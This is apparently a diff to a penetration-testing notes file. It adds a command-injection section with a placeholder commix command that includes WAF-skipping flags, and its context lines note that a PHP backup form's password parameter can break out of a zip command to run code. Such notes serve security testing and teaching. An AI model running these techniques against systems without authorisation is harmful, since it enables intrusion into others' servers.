@@ -24,3 +24,9 @@ if (isset($_POST['backup']) && !empty($_POST['password'])) {
         ];
 # In this example, we can terminate the zip command and execute code using the "Password Parameter"
 ```
+## Exploitation
+### Command injection
+Using commix to detect and exploit command injection
+```bash
+commix --url="<URL>?<parameter>=" --level=3 --force-ssl --skip-waf --random-agent --cookie="<cookie>"
+```
